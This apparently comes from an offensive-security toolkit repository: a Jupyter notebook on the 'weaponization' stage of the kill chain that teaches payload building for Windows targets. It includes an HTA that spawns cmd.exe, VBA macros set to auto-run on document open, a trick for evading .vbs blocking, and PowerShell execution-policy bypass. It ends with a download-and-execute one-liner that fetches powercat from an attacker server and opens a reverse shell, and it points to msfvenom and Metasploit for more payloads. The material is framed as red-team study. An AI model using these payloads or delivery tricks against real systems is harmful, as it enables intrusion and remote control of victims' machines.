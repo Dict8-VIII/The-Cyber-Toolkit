{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "beaf8adf-bf53-4a2d-98c9-743a8df5ecce",
   "metadata": {},
   "source": [
    "# Killchain - Weaponization\n",
    "\n",
    "Weaponization is the process of creating a payload that will be used for an attack. It follows Recon to understand what attacks may work, and preceeds delivery because well... you need something to deliver. In many cases, the payload will be embedded in something else (such as a PDF or email) and these are all included in weaponization.\n",
    "\n",
    "<hr>\n",
    "\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b344a746-f7bf-434e-bc3c-59b87ab54302",
   "metadata": {},
   "source": [
    "## Windows Example: WSH / Wscript/CScript\n",
    "WSH, or the Windows Script Host is a built in tool for automating tasks in the windows OS. It includes 2 engines\n",
    "- cscript.exe : For command line\n",
    "- wscript.exe : For a UI\n",
    "\n",
    "Both execute VisualBasic scripts such as .vbs and .vbe. When a script is run, it runs with the rights of a standard user.<br>\n",
    "\n",
    "**Example VBScript (alert box):**<br>\n",
    "\n",
    "> Dim message <br>\n",
    "> message = \"Wassup!!!\"<br>\n",
    "> MsgBox message\n",
    "\n",
    "So, what does this do? First we define a variable \"message\", then we set it to the value \"Wassup!!!\" and lastly we display it in a popup/alert/message box. <br>\n",
    "\n",
    "\n",
    "**Example VBScript (run shell command):**"
   ]
  },
  {
   "cell_type": "raw",
   "id": "0621ec64-c6f6-4a84-8683-fcd33139e0f5",
   "metadata": {},
   "source": [
    "Set shell = Wscript.CreateObject(\"Wscript.Shell\")<br>\n",
    "shell.Run(\"C:\\Windows\\System32\\Explorer.exe\" & WScript.ScriptFullName),0,True"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7da7e321-06f4-44d7-88c6-25a155dfbd83",
   "metadata": {},
   "source": [
    "You can now run this, and it will launch an explorer window. Sometimes a vbs extension can be blocked. Fortunately you can just store it as a .txt file and call the file with an arguement to force the extension.<br>\n",
    "\n",
    "> wscript /e:VBScript [sneakyfile.txt]\n",
    "\n",
    "<hr>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "feb40c59-0cd4-496b-824c-ede1de737c21",
   "metadata": {},
   "source": [
    "## Windows Example: HTA\n",
    "\n",
    "An HTA, or HTML Application is simply a standalone HTML file which can be download and run alone. For our purpose, you embed the attack in a HTML file and then publish this for a target to access (via Social Engineering, redirects, SEO Posioning etc).<br>\n",
    "\n",
    "**Example HTA**"
   ]
  },
  {
   "cell_type": "raw",
   "id": "a65ff291-028f-4a42-8c4d-334654096a02",
   "metadata": {},
   "source": [
    "<html>\n",
    "<body>\n",
    "<script>\n",
    "\tvar c= 'cmd.exe'\n",
    "\tnew ActiveXObject('WScript.Shell').Run(c);\n",
    "</script>\n",
    "</body>\n",
    "</html>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d35eb83c-83f6-4a7d-9dff-18ff2143ac82",
   "metadata": {},
   "source": [
    "When this file is opened/run by the target, it will spawn a CMD window.<br>\n",
    "\n",
    "Not so helpful by itself (unless you provide arguemenst to the CMD window), but you can also create a reverse shell using [msfvenom](../Tools/Msfvenom.ipynb) or straight in metasploit itself using exploit/windows/misc/hta_server.\n",
    "\n",
    "<hr>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4a07da58-f57b-402f-ad87-c09bc7c71ae0",
   "metadata": {},
   "source": [
    "## Windows Example: VBA\n",
    "\n",
    "VBA, or Visual Basic for Applications, is a microsoft language implimented for their office applications. Its purpose is to enable automation of all interactions in the office environment. Perhaps the most common application is Macros.<br>\n",
    "\n",
    "**Example Macro : Popup**<br>"
   ]
  },
  {
   "cell_type": "raw",
   "id": "3078d557-1592-48b9-b495-d192401a00bd",
   "metadata": {},
   "source": [
    "Sub ImAMacro()\n",
    "  MsgBox (\"All your words are belonging to us\")\n",
    "End Sub"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "20d3f0fb-b276-424e-8815-6056f94ffb0c",
   "metadata": {},
   "source": [
    "Great, so we've written a macro, but it still needs to be called, or it will just sit there. Not so fun. Set it to run on document open OR Auto open by adding this below our original code."
   ]
  },
  {
   "cell_type": "raw",
   "id": "76aae670-eb2d-4d81-8e84-86783568991d",
   "metadata": {},
   "source": [
    "Sub Document_Open()\n",
    "  ImAMacro\n",
    "End Sub\n",
    "\n",
    "Sub AutoOpen()\n",
    "  ImAMacro\n",
    "End Sub"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "65b251e9-5997-4a76-9e4a-34b6290429b7",
   "metadata": {},
   "source": [
    "Now save the document as a macro enabled type. This includes .doc and .docm. You can now try open the file, but it will warn that macros have been disabled, like a good application should. Lets pretend we have been social engineered and click 'enable content'. You should now get your popup :-).<br>\n",
    "Honestly, popups arent so fun though. How about we run an exe by joining in our wscript code from before?\n",
    "\n",
    "**Example Macro: exe**"
   ]
  },
  {
   "cell_type": "raw",
   "id": "31bbba63-6d41-41c8-9e89-598f743f428f",
   "metadata": {},
   "source": [
    "Sub MoreFun()\n",
    "\tDim payload As String\n",
    "\tpayload = \"calc.exe\"\n",
    "\tCreateObject(\"Wscript.Shell\").Run payload,0\n",
    "End Sub"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fde29457-02ff-413c-8e2b-cee3217cd5cf",
   "metadata": {},
   "source": [
    "This one isnt as straight forward, but you can get the idea. The 2nd line just defines the variable 'payload' as a type 'string'. We can then assign a string to it and go ahead<br>\n",
    "\n",
    "Once again, these can all be generated in [msfvenom](../Tools/Msfvenom.ipynb) to create a reverse shell.\n",
    "\n",
    "<hr>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80b2d6fd-071b-4755-a565-cfe581894bae",
   "metadata": {},
   "source": [
    "## Windows Example: Powershell\n",
    "\n",
    "Windows Powershell is the 'advanced' terminal application, as opposed to cmd. It is executed in .NET except for some legacy cases. It has 2 levels of execution, Restricted and 'Bypass'. In restricted mode, the execution is limited. You can see your current level with\n",
    "\n",
    "> Get-ExecutionPolicy\n",
    "\n",
    "You can change this with the set variant of the command\n",
    "\n",
    "> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned\n",
    "\n",
    "Alternatively, you can launch PS with a bypass arguement\n",
    "\n",
    "> powershell -ex bypass -File 'file.ps1'\n",
    "\n",
    "Once youre in powershell, theres a usefull tool known as powercat. It is a Powershell script that creates a reverse shell. You can pull it from github\n",
    "\n",
    "> git clone https://github.com/besimorhino/powercat.git<br>\n",
    "> cd powercat<br>\n",
    "> Python3 -m http.server 8080\n",
    "\n",
    "On the target machine\n",
    "> powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://attackserver:8080/powercat.ps1');powercat -c attackserver -p 1337 -e cmd\"\n",
    "\n",
    "attackServer is your listener\n",
    "\n",
    "<hr>\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c6c6d08e-82c9-4193-8e94-31764308a37e",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}